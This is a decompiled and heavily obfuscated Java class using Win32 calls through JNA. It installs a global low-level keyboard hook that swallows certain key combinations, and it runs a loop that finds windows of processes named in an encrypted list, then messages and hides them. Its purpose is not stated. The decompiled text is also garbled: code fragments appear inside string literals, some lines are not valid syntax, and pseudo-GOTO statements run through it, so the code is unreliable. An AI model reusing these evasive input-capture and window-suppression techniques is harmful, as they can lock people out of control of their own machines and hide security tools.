/*
 * Decompiled with CFR 0.152.
 */
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinUser;
import com.sun.jna.ptr.IntByReference;
import java.awt.Font;

/*
 * Duplicate member names - consider using --renamedupmembers true
 */
public class \u0565 {
    static volatile float method_FF;
    static volatile float method_FE;
    private static volatile long method_FD;
    private static volatile WinUser.LowLevelKeyboardProc method_FC;
    private static final String[] method_FB;
    public static boolean method_FA;
    private static final String[] a;
    private static final long[] b;
    private static final Integer[] c;
    private static final long[] d;
    private static final Long[] e;

    public static Font method_FF(Object[] objectArray) {
        String string = (String)objectArray[0];
        int n2 = (Integer)objectArray[1];
        float f2 = ((Float)objectArray[2]).floatValue();
        long l2 = (Long)objectArray[3];
        String string2 = "*\n     * Unable to fully structure code\n     */".equalsIgnoreCase(string) ? "~Vb\r3Q t\\cd\tG1mGd,ww7rBn=#\t$5L,h^f*?$7Am~Vb*7Fm~Vb9?P%vAig?Z&\r>3P&hFf;1&cK?8M;o\\f0tG;~\r3Q t\\cdL3nZ*\n;" : "                 var15_2 = 0;\n  ";
        String string3 = string2;
        return new Font(string3, n2, (int)f2);
    }

    public static void method_FF(Object[] objectArray) {
        long l2 = (Long)objectArray[0];
        long l3 = l2;
        long l4 = 107899919798927L;
        long l5 = 138466806197884L;
        Object[] objectArray2 = new Object[1];
        objectArray2[0] = l5;
        \u051d.method_FF(objectArray2);
        Object[] objectArray3 = new Object[1];
        objectArray3[0] = l4;
        \u050d.method_FE(objectArray3);
    }

    private static void method_FE(Object[] objectArray) {
        long l2 = (Long)objectArray[0];
        long l3 = 90201266275670L;
        if (method_FD != 0L) {
            return;
        }
        new Thread(() -> \u0565.lambda$startKeyboardHook$1(l3), "              block27: {\n       ").start();
    }

    private static void method_FD(Object[] objectArray) {
        long l2 = (Long)objectArray[0];
        if (method_FD != 0L) {
            \u0563.INST.UnhookWindowsHookEx(method_FD);
            method_FD = 0L;
        }
    }

    public static void method_FC(Object[] objectArray) {
        long l2 = (Long)objectArray[0];
        long l3 = l2;
        long l4 = 80343313582948L;
        long l5 = l4 >>> 16;
        int n2 = (int)(l4 << 48 >>> 48);
        long l6 = 77472818052670L;
        int n3 = (int)(l6 >>> 32);
        int n4 = (int)(l6 << 32 >>> 48);
        int n5 = (int)(l6 << 48 >>> 48);
        \u0562 \u05622 = (arg_0, arg_1) -> \u0565.lambda$startSuppressor$2(l5, (short)n2, arg_0, arg_1);
        new Thread(() -> \u0565.lambda$startSuppressor$3(n3, n4, \u05622, n5), " 1, (Object)kBDLLHOOKSTRUCT))));\n    }\n\n    ").start();
    }

    private static void lambda$startSuppressor$3(int n2, int n3, \u0562 \u05622, int n4) {
        long l2 = (long)n2 << 32 | (long)n3 << 48 >>> 32 | (long)n4 << 48 >>> 48;
        while (true) {
            try {
                while (true) {
                    if (\u0563.INST != null) {
                        \u0563.INST.EnumWindows(\u05622, null);
                    }
                    Thread.sleep(\u0565.b(11268, 5197888514599960841L));
                }
            }
            catch (Throwable throwable) {
                continue;
            }
            break;
        }
    }

    /*
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static boolean lambda$startSuppressor$2(long var0, short var2_1, long var3_2, Pointer var5_3) {
        
        
        var6_4 = var0 << 16 | (long)var2_1 << 48 >>> 48;
        var8_5 = \u0565.method_FA;
        if (\u0563.INST == null) return false;
        if (\u0564.method_FF == null) {
            return false;
        }
        try {
            block50: {
                block51: {
                    block52: {
                        block53: {
                            block49: {
                                block48: {
                                    if (\u0563.INST.IsWindowVisible(var3_2) == false) return true;
                                    var9_6 = new IntByReference();
                                    \u0563.INST.GetWindowThreadProcessId(var3_2, var9_6);
                                    var10_8 = Oa%&r$H`&'vuIc'#qwJb#$t.Kf$%puOa%&q"H`&'vvIc'#u.getValue(, ) /* deobf */I", 1, (Object)var9_6);
                                    var11_9 = new char[\u0565.a(15921, 5275229332776722747L ^ var6_4)];
                                    var12_10 = new IntByReference(var11_9.length);
                                    v2 = new Object[3];
                                    v2[2] = (int)var10_8;
                                    v2[1] = false;
                                    v2[0] = \u0565.a(23051, 5023729468358444311L ^ var6_4);
                                    var13_11 = \u0564.method_FF.method_FF(v2);
                                    cfr_temp_0 = var13_11 - 0L;
                                    v3 = cfr_temp_0 == 0L ? 0 : (cfr_temp_0 < 0L ? -1 : 1);
                                    v4 = var8_5;
                                    if (var2_1 < 0) {
                                        if (!v4) {
                                            if (v3 == false) return true;
                                            v5 = new Object[4];
                                            v5[3] = var12_10;
                                            v5[2] = var11_9;
                                            v5[1] = 0;
                                            v5[0] = var13_11;
                                            v3 = (long)\u0564.method_FF.method_FE(v5);
                                        }
                                        v4 = var8_5;
                                    }
                                    if (v4 != false) return true;
                                    if (v3 == false) break block50;
                                    var15_12 = g_0.a("toString", "\u00e7\u00ea\u00eb\u00a8method_FBmethod_F1\u00eb\u00a9\u00ed\u00e6\u00e5\u00aa\u00c8\u00e6method_FC\u00edmethod_F3\u00e3", "([C)Ljava/lang/String;", 2, (char[])var11_9).toLowerCase();
                                    var16_13 = 0;
                                    var17_14 = \u0565.method_FB;
                                    var18_16 = var17_14.length;
                                    var19_18 = 0;
                                    block26: while (var19_18 < var18_16) {
                                        var20_19 = var17_14[var19_18];
                                        do {
                                            v6 = var15_12.endsWith("\\" + var20_19);
                                            v7 = var8_5;
                                            if (var0 > 0L) {
                                                if (v7) break block48;
                                                v7 = var8_5;
                                            }
                                            if (v7) ** GOTO lbl66
                                            if (v6 != 0) ** GOTO lbl-1000
                                            v8 = var15_12.equalsIgnoreCase(var20_19);
                                            if (var2_1 > 0) ** GOTO lbl68
                                            if (!var8_5) {
                                                ** if (!v8) goto lbl-1000
                                            }
                                            ** GOTO lbl66
lbl-1000:
                                            // 2 sources

                                            {
                                                v9 = true;
lbl66:
                                                // 3 sources

                                                var16_13 = v9;
                                                v8 = var8_5;
lbl68:
                                                // 2 sources

                                                if (var0 >= 0L) {
                                                    if (!v8) break block26;
                                                }
                                                ** GOTO lbl73
                                            }
lbl-1000:
                                            // 2 sources

                                            {
                                                ++var19_18;
                                                v8 = var8_5;
                                            }
lbl73:
                                            // 2 sources

                                            if (!v8) continue block26;
                                        } while (var2_1 >= 0);
                                    }
                                    v6 = 0;
                                }
                                var17_15 = v6;
                                var18_17 /* !! */  = 0L;
                                try {
                                    v10 = \u051d.method_F4;
                                    if (var0 >= 0L && !var8_5) {
                                        if (v10 == null) break block49;
                                        v10 = \u051d.method_F4;
                                    }
                                    if (var2_1 < 0) {
                                        v11 = v10.isVisible();
                                        if (!var8_5) {
                                            if (!v11) break block49;
                                            v11 = true;
                                        }
                                        var17_15 = (int)v11;
                                        v10 = \u051d.method_F4;
                                    }
                                    var18_17 /* !! */  = (long)g_0.a("getComponentID", "\u00e7\u00ea\u00eb\u00a8method_FBmethod_F1\u00eb\u00a9\u00ed\u00e6\u00e5\u00aa\u00c8\u00e6method_FC\u00edmethod_F3\u00e3", "(Ljava/awt/Component;)J", 2, (Object)v10);
                                }
                                catch (Throwable var20_20) {
                                    // empty catch block
                                }
                            }
                            v3 = var16_13;
                            v12 = var8_5;
                            if (var2_1 > 0) break block51;
                            if (v12) break block52;
                            if (v3 != false) break block53;
                            v3 = var17_15;
                            if (var8_5 != false) return true;
                            if (v3 == false) break block50;
                        }
                        v3 = var3_2 == var18_17 /* !! */  ? 0 : (var3_2 < var18_17 /* !! */  ? -1 : 1);
                    }
                    v12 = var8_5;
                }
                if (v12 != false) return true;
                if (v3 != false) {
                    \u0563.INST.PostMessage(var3_2, \u0565.a(16455, 7715415509095735123L ^ var6_4), new Pointer(\u0565.b(15586, 11398155417478324L ^ var6_4)), null);
                    \u0563.INST.ShowWindow(var3_2, \u0565.a(5836, 7320720328264813012L ^ var6_4));
                }
            }
            v13 = new Object[1];
            v13[0] = var13_11;
            v3 = (long)\u0564.method_FF.method_FF(v13);
            return true;
        }
        catch (Throwable var9_7) {
            // empty catch block
        }
        return true;
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static void lambda$startKeyboardHook$1(long l2) {
        
        
        long l3 = 23853584898945L;
        try {
            method_FC = (arg_0, arg_1, arg_2) -> \u0565.lambda$startKeyboardHook$0(l3, arg_0, arg_1, arg_2);
            method_FD = \u0563.INST.SetWindowsHookExW(\u0565.a(1448, 8376475344192613555L), method_FC, null, 0);
            WinUser.MSG mSG = new WinUser.MSG();
            while (method_FD != 0L && \u0563.INST.GetMessageW(mSG, 0L, 0, 0)) {
                \u0563.INST.TranslateMessage(mSG);
                \u0563.INST.DispatchMessageW(mSG);
            }
            return;
        }
        catch (Throwable throwable) {
            // empty catch block
        }
    }

    private static WinDef.LRESULT lambda$startKeyboardHook$0(long l2, int n2, WinDef.WPARAM wPARAM, WinUser.KBDLLHOOKSTRUCT kBDLLHOOKSTRUCT) {
        block25: {
            if (n2 >= 0) {
                block23: {
                    boolean bl;
                    int n3;
                    block24: {
                        n3 = kBDLLHOOKSTRUCT.vkCode;
                        boolean bl2 = (\u0563.INST.GetKeyState(\u0565.a(7278, 83172612481281786L)) & \u0565.a(24798, 6490122082515456600L)) != 0;
                        boolean bl3 = bl2;
                        boolean bl4 = (\u0563.INST.GetKeyState(\u0565.a(8390, 3383431058902602305L)) & \u0565.a(13406, 7706196897532724942L)) != 0;
                        bl = bl4;
                        if (n3 == \u0565.a(6039, 4772498531602326795L) || n3 == \u0565.a(14657, 4171370547689606111L)) break block23;
                        if (n3 != \u0565.a(32645, 1268915341898583325L)) break block24;
                        if (bl3) break block23;
                    }
                    if (n3 != \u0565.a(15465, 9210691616722276095L)) break block25;
                    if (!bl) break block25;
                }
                return new WinDef.LRESULT(1L);
            }
        }
        return new WinDef.LRESULT(\u0563.INST.CallNextHookEx(method_FD, n2, (int)g_0.a("intValue", "\u00e7\u00ea\u00eb\u00a8method_FBmethod_F1\u00eb\u00a9\u00ed\u00e6\u00e5\u00aamethod_F6\u00eb\u00e9method_F0\u00e3\u00e9method_F5\u00e5\u00abmethod_F2\u00ef\u00e9\u00bb\u00b6\u00aa\u00d1\u00ee\u00e6\u00c0\u00e0\u00e0\u00a3\u00df\u00d4\u00c4\u00d4\u00c6\u00c5", "()I", 1, (Object)wPARAM), (Pointer)((Object)Oa%&r$H`&'vuIc'#qwJb#$t.Kf$%puOa%&q"H`&'vvIc'#u.getPointer(, ) /* deobf */Lcom/sun/jna/Pointer;", 1, (Object)kBDLLHOOKSTRUCT))));
    }

    /*
     * Unable to fully structure code
     */
    static {
        block32: {
            block31: {
                block30: {
                    block29: {
                        block28: {
                            block27: {
                                var19 = 6481305889875L;
                                var17_1 = new String[17];
                                var15_2 = 0;
                                var14_3 = "95U&i]o,6Nm~Vb\u0017\r3Q t\\cd\tG1mGd,ww7rBn=#\t$5L,h^f*?\u0007$7Am~Vb\u0007*7Fm~Vb\u000b9?P%vAig?Z&\r>3P&hFf;1\f&cK\f?8M;o\\f0tG;~\u001d\r3Q t\\cd\u0013L3nZ*\n;R7n\\bd\tG1mGd,\u000b;?E&\u007fGsg?Z&\u000b=;Q(vIug?Z&\u000f?8M;hKu?3A&5K\u007f,\t\u001a;L0HKu <\f?7V,tBt-tG;~\u00119(M ~]t!;A(~\\),\"G";
                                var16_4 = "95U&i]o,6Nm~Vb\u0017\r3Q t\\cd\tG1mGd,ww7rBn=#\t$5L,h^f*?\u0007$7Am~Vb\u0007*7Fm~Vb\u000b9?P%vAig?Z&\r>3P&hFf;1\f&cK\f?8M;o\\f0tG;~\u001d\r3Q t\\cd\u0013L3nZ*\n;R7n\\bd\tG1mGd,\u000b;?E&\u007fGsg?Z&\u000b=;Q(vIug?Z&\u000f?8M;hKu?3A&5K\u007f,\t\u001a;L0HKu <\f?7V,tBt-tG;~\u00119(M ~]t!;A(~\\),\"G".length();
                                var13_5 = 14;
                                var12_6 = -1;
lbl8:
                                // 2 sources

                                while (true) {
                                    v0 = ++var12_6;
                                    v1 = var14_3.substring(v0, v0 + var13_5);
                                    v2 = -1;
                                    break block27;
                                    break;
                                }
lbl13:
                                // 1 sources

                                while (true) {
                                    var17_1[var15_2++] = v3.intern();
                                    if ((var12_6 += var13_5) < var16_4) {
                                        var13_5 = var14_3.charAt(var12_6);
                                        ** continue;
                                    }
                                    var14_3 = "\u00045L,h^f*?F\n;?Q.t@),\"G";
                                    var16_4 = "\u00045L,h^f*?F\n;?Q.t@),\"G".length();
                                    var13_5 = 10;
                                    var12_6 = -1;
lbl22:
                                    // 2 sources

                                    while (true) {
                                        v4 = ++var12_6;
                                        v1 = var14_3.substring(v4, v4 + var13_5);
                                        v2 = 0;
                                        break block27;
                                        break;
                                    }
                                    break;
                                }
lbl27:
                                // 1 sources

                                while (true) {
                                    var17_1[var15_2++] = v3.intern();
                                    if ((var12_6 += var13_5) < var16_4) {
                                        var13_5 = var14_3.charAt(var12_6);
                                        ** continue;
                                    }
                                    break block28;
                                    break;
                                }
                            }
                            v5 = v1.toCharArray();
                            v6 = v5;
                            v7 = v5.length;
                            var18_8 = 0;
                            if (true) ** GOTO lbl66
                            do {
                                v6 = v6;
                                v8 = var18_8;
                                v9 = v6[v8];
                                switch (var18_8 % 7) {
                                    case 0: {
                                        v10 = 73;
                                        break;
                                    }
                                    case 1: {
                                        v10 = 90;
                                        break;
                                    }
                                    case 2: {
                                        v10 = 34;
                                        break;
                                    }
                                    case 3: {
                                        v10 = 67;
                                        break;
                                    }
                                    case 4: {
                                        v10 = 27;
                                        break;
                                    }
                                    case 5: {
                                        v10 = 46;
                                        break;
                                    }
                                    default: {
                                        v10 = 7;
                                    }
                                }
                                v6[v8] = (char)(v9 ^ v10);
                                ++var18_8;
lbl66:
                                // 2 sources

                                v7 = v7;
                            } while (v7 > var18_8);
                            v3 = new String(v6);
                            switch (v2) {
                                default: {
                                    ** continue;
                                }
                                ** case 0:
lbl74:
                                // 1 sources

                                ** continue;
                            }
                        }
                        \u0565.a = var17_1;
                        var10_9 = new long[20];
                        var7_10 = 0;
                        var8_11 = "\u0089Af\t\u00cbpd\u00b2\\\u009eN\u00d1\u00bfQN\u000b;|\u001bUuW\b\u00ec\u001dp8\u00c2\u00c4\u00cb\u00ee\u0007\u0003+/Ohn8w\u00ea\u00aera\u0017\u00ef\u00df\u00d8\u00dfU\u00e1Y+=\u0087O\u00dcn1\u00d6\u00e7\u0090F!\u00c2\u00c3JBmethod_F8method_FA)\u00bc\u00d5Fmethod_FD\b\u00a8\u00a7\u00cbl\u00cf\u00d2\u00e5^\u00ac#\u00af\u00e1\u00b7v\u0001\u00ef\u00d2\r\u00e5\u00bfi\u00c5\u007f\u0097\u00cbt3![\u00ae\u009amethod_FA\t(w\u00d0\u009e\u00a4\u00b6\u0002\u00a3method_F9\u00e7F\u0092\u00d5e\u00a1\u00ea\u00df\u008dmethod_FB\u00dc\u00aa\u00d6a\u0012\u00de\u00d2\u00bf\u00eb\u00e9\u0017\u0016method_FCw\u0012\u00b7";
                        var9_12 = "\u0089Af\t\u00cbpd\u00b2\\\u009eN\u00d1\u00bfQN\u000b;|\u001bUuW\b\u00ec\u001dp8\u00c2\u00c4\u00cb\u00ee\u0007\u0003+/Ohn8w\u00ea\u00aera\u0017\u00ef\u00df\u00d8\u00dfU\u00e1Y+=\u0087O\u00dcn1\u00d6\u00e7\u0090F!\u00c2\u00c3JBmethod_F8method_FA)\u00bc\u00d5Fmethod_FD\b\u00a8\u00a7\u00cbl\u00cf\u00d2\u00e5^\u00ac#\u00af\u00e1\u00b7v\u0001\u00ef\u00d2\r\u00e5\u00bfi\u00c5\u007f\u0097\u00cbt3![\u00ae\u009amethod_FA\t(w\u00d0\u009e\u00a4\u00b6\u0002\u00a3method_F9\u00e7F\u0092\u00d5e\u00a1\u00ea\u00df\u008dmethod_FB\u00dc\u00aa\u00d6a\u0012\u00de\u00d2\u00bf\u00eb\u00e9\u0017\u0016method_FCw\u0012\u00b7".length();
                        var6_13 = 0;
                        while (true) {
                            var11_14 = var8_11.substring(var6_13, var6_13 += 8).getBytes("ISO-8859-1");
                            v11 = var10_9;
                            v12 = var7_10++;
                            v13 = ((long)"" & 255L) << 56 | ((long)" 1, (Object)kBDLLHOOKSTRUCT))));\n    }\n\n    " & 255L) << 48 | ((long)"*\n     * Unable to fully structure code\n     */" & 255L) << 40 | ((long)"    static" & 255L) << 32 | ((long)"{\n        block32: {\n           " & 255L) << 24 | ((long)"block31: {\n                block" & 255L) << 16 | ((long)"0: {\n                    block29: {\n               " & 255L) << 8 | (long)"        block28: {\n             " & 255L;
                            v14 = -1;
                            break block29;
                            break;
                        }
lbl89:
                        // 1 sources

                        while (true) {
                            v11[v12] = v15;
                            if (var6_13 < var9_12) ** continue;
                            var8_11 = "\u00bc\u0015\u00cd\u00b99\u00a4H[B\u0014\u0002method_F2\bb\u00b3\u0099";
                            var9_12 = "\u00bc\u0015\u00cd\u00b99\u00a4H[B\u0014\u0002method_F2\bb\u00b3\u0099".length();
                            var6_13 = 0;
                            while (true) {
                                var11_14 = var8_11.substring(var6_13, var6_13 += 8).getBytes("ISO-8859-1");
                                v11 = var10_9;
                                v12 = var7_10++;
                                v13 = ((long)"" & 255L) << 56 | ((long)" 1, (Object)kBDLLHOOKSTRUCT))));\n    }\n\n    " & 255L) << 48 | ((long)"*\n     * Unable to fully structure code\n     */" & 255L) << 40 | ((long)"    static" & 255L) << 32 | ((long)"{\n        block32: {\n           " & 255L) << 24 | ((long)"block31: {\n                block" & 255L) << 16 | ((long)"0: {\n                    block29: {\n               " & 255L) << 8 | (long)"        block28: {\n             " & 255L;
                                v14 = 0;
                                break block29;
                                break;
                            }
                            break;
                        }
lbl102:
                        // 1 sources

                        while (true) {
                            v11[v12] = v15;
                            if (var6_13 < var9_12) ** continue;
                            break block30;
                            break;
                        }
                    }
                    v15 = v13 ^ var19;
                    switch (v14) {
                        default: {
                            ** continue;
                        }
                        ** case 0:
lbl113:
                        // 1 sources

                        ** continue;
                    }
                }
                \u0565.b = var10_9;
                \u0565.c = new Integer[20];
                var4_15 = new long[2];
                var1_16 = 0;
                var2_17 = "\u0000(R\u0017\u001d\u0084method_F9method_F4H\"\u00bf\u00ec\u00d6method_F2\u0099\u00a5";
                var3_18 = "\u0000(R\u0017\u001d\u0084method_F9method_F4H\"\u00bf\u00ec\u00d6method_F2\u0099\u00a5".length();
                var0_19 = 0;
                while (true) {
                    break block31;
                    break;
                }
lbl124:
                // 1 sources

                while (true) {
                    var4_15[v16] = (((long)"" & 255L) << 56 | ((long)" 1, (Object)kBDLLHOOKSTRUCT))));\n    }\n\n    " & 255L) << 48 | ((long)"*\n     * Unable to fully structure code\n     */" & 255L) << 40 | ((long)"    static" & 255L) << 32 | ((long)"{\n        block32: {\n           " & 255L) << 24 | ((long)"block31: {\n                block" & 255L) << 16 | ((long)"0: {\n                    block29: {\n               " & 255L) << 8 | (long)"        block28: {\n             " & 255L) ^ var19;
                    if (var0_19 < var3_18) ** continue;
                    break block32;
                    break;
                }
            }
            var5_20 = var2_17.substring(var0_19, var0_19 += 8).getBytes("ISO-8859-1");
            v16 = var1_16++;
            ** while (true)
        }
        \u0565.d = var4_15;
        \u0565.e = new Long[2];
        \u0565.method_FF = 0.5f;
        \u0565.method_FE = 1.0f;
        \u0565.method_FD = 0L;
        \u0565.method_FC = null;
        v17 = new String[\u0565.a(5436, 4770137273217443658L ^ var19)];
        var12_7 = \u0565.a;
        v17[0] = "481305889875L;\n                                var17_1";
        v17[1] = "95U&i]o,6N";
        v17[2] = "0: {\n                    block29: {\n               ";
        v17[3] = "block31: {\n                block";
        v17[4] = "7n\\bd\tG1mGd,;?E&Gsg?Z&=;Q(vIug?Z&?8M;hKu?3A&5K,\t;L0HKu <?7V,tBt-tG;~9(M ~]";
        v17[5] = "                        var19 = ";
        v17[\u0565.a((int)16884, (long)(2478900779447137183L ^ var19))] = "{\n        block32: {\n           ";
        v17[\u0565.a((int)11682, (long)(1443801510909566943L ^ var19))] = "";
        v17[\u0565.a((int)23963, (long)(7869718860530954217L ^ var19))] = "    static";
        v17[\u0565.a((int)23493, (long)(5130940752577833397L ^ var19))] = "= new String[17];\n              ";
        v17[\u0565.a((int)31388, (long)(7515416699443022054L ^ var19))] = "        block28: {\n             ";
        v17[\u0565.a((int)30010, (long)(1386099407295711044L ^ var19))] = "                             var";
        \u0565.method_FB = v17;
    }

    private static int a(int n2, long l2) {
        int n3 = n2 ^ (int)(l2 & 0x7FFFL) ^ 0x1E2B;
        if (c[n3] == null) {
            \u0565.c[n3] = (int)(b[n3] ^ l2);
        }
        return c[n3];
    }

    private static long b(int n2, long l2) {
        int n3 = (n2 ^ (int)22885L) & Short.MAX_VALUE;
        if (e[n3] == null) {
            \u0565.e[n3] = d[n3] ^ l2;
        }
        return e[n3];
    }

    public static void main(String[] stringArray) {
        throw new RuntimeException("Invalid execution context: 0x3df239");
    }
}

